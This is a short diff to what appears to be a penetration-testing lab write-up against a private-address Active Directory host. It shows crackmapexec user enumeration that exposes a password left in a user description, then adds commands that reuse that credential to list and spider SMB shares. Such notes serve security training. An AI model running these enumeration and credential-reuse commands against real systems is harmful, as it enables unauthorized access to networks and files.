@@ -1040,7 +1040,8 @@ crackmapexec smb 192.168.124.175 -u '' -p '' --users
 SMB         192.168.124.175 445    RESOURCEDC       resourced.local\V.Ventz                        New-hired, reminder: HotelCalifornia194!
 
 # resourced.local\V.Ventz : HotelCalifornia194!
-
+crackmapexec smb 192.168.124.175 -u 'V.Ventz' -p 'HotelCalifornia194!' --shares
+crackmapexec smb 192.168.124.175 -u 'V.Ventz' -p 'HotelCalifornia194!' --spider  --regex .
 
 ```
 
